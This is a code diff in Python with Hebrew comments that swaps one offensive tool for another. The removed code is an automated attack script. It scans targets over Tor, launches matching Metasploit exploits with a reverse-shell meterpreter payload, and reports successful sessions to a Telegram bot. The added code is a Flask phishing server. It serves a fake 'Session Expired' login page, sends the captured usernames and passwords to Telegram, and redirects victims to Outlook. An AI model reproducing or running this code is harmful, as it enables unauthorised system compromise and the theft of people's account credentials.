@@ -1,82 +1,45 @@
-import nmap, shodan, time, sys, os, requests, socket
-from pymetasploit3.msfrpc import MsfRpcClient
-from colorama import Fore, init
+from flask import Flask, request, redirect, render_template_string
+import requests
 
-init(autoreset=True)
+app = Flask(__name__)
 
-# --- CONFIGURATION ---
-CONFIG = {
-    'SHODAN_KEY': 'YOUR_SHODAN_KEY',
-    'MSF_PASS': 'mypassword',
-    'LHOST': 'YOUR_IP_OR_NGROK',
-    'TG_TOKEN': 'YOUR_TELEGRAM_BOT_TOKEN',
-    'CHAT_ID': 'YOUR_CHAT_ID'
-}
+# הגדרות טלגרם
+TG_TOKEN = "YOUR_TELEGRAM_TOKEN"
+CHAT_ID = "YOUR_CHAT_ID"
 
-def send_tg(msg):
-    try:
-        url = f"https://api.telegram.org/bot{CONFIG['TG_TOKEN']}/sendMessage"
-        requests.post(url, data={'chat_id': CONFIG['CHAT_ID'], 'text': msg})
-    except: pass
+# דף התחברות מעוצב (HTML פשוט)
+HTML = '''
+<html>
+<head><title>Sign In</title></head>
+<body style="font-family: Arial; text-align: center; margin-top: 100px;">
+    <div style="display: inline-block; border: 1px solid #ccc; padding: 20px; border-radius: 5px;">
+        <h2>Session Expired</h2>
+        <p>Please log in again to continue.</p>
+        <form method="POST">
+            <input type="text" name="u" placeholder="Email or Username" required style="margin-bottom: 10px; width: 200px;"><br>
+            <input type="password" name="p" placeholder="Password" required style="margin-bottom: 10px; width: 200px;"><br>
+            <input type="submit" value="Login" style="background: #0078d4; color: white; border: none; padding: 5px 20px; cursor: pointer;">
+        </form>
+    </div>
+</body>
+</html>
+'''
 
-class ApexPredator:
-    def __init__(self):
-        try:
-            self.client = MsfRpcClient(CONFIG['MSF_PASS'], port=55553)
-            self.nm = nmap.PortScanner()
-            print(Fore.GREEN + "[+] System Online & Connected to Metasploit")
-        except Exception as e:
-            print(Fore.RED + f"[-] Connection Error: {e}")
-            sys.exit()
-
-    def resolve_target(self, target):
-        try:
-            ip = socket.gethostbyname(target.replace("http://","").replace("https://","").split('/')[0])
-            return ip
-        except: return target
-
-    def run_attack(self, target_input):
-        ip = self.resolve_target(target_input)
-        send_tg(f"🚀 Attack Started on: {target_input} ({ip})")
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('u')
+        password = request.form.get('p')
         
-        print(Fore.CYAN + f"[*] Scanning {ip} for vulnerabilities...")
-        # סריקה אגרסיבית אך אנונימית
-        args = "--proxies socks5://127.0.0.1:9050 -sV -Pn -T3 --script vulners"
-        self.nm.scan(ip, arguments=args)
+        # שליחה לטלגרם
+        data = f"📩 **New Credentials Captured!**\n👤 User: `{username}`\n🔑 Pass: `{password}`"
+        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': data, 'parse_mode': 'Markdown'})
         
-        if ip not in self.nm.all_hosts():
-            send_tg(f"❌ Target {ip} seems down.")
-            return
-
-        for proto in self.nm[ip].all_protocols():
-            ports = self.nm[ip][proto].keys()
-            for port in ports:
-                service = self.nm[ip][proto][port]['name']
-                print(Fore.YELLOW + f"[*] Testing service: {service} on port {port}")
-                
-                # חיפוש אקספלויט מתאים ב-Metasploit
-                matches = self.client.modules.search(service)
-                for match in matches:
-                    if match['type'] == 'exploit':
-                        exploit = self.client.modules.use('exploit', match['fullname'])
-                        exploit['RHOSTS'] = ip
-                        exploit['RPORT'] = port
-                        
-                        # ניסיון הרצת Payload
-                        payload = self.client.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
-                        payload['LHOST'] = CONFIG['LHOST']
-                        
-                        print(Fore.RED + f"[!] Executing {match['fullname']}...")
-                        exploit.execute(payload=payload)
-                        
-                        time.sleep(5)
-                        if self.client.sessions.list:
-                            send_tg(f"💰 SUCCESS! Session opened on {ip}")
-                            return
-
-        send_tg(f"🏁 Attack finished on {ip}. No immediate entry found.")
+        # העברה לאתר לגיטימי
+        return redirect("https://outlook.live.com")
+    
+    return render_template_string(HTML)
 
 if __name__ == "__main__":
-    app = ApexPredator()
-    target = input("Enter Target (IP/Domain): ")
-    app.run_attack(target)
+    print("[*] Phishing server starting on port 8080...")
+    app.run(host='0.0.0.0', port=8080)
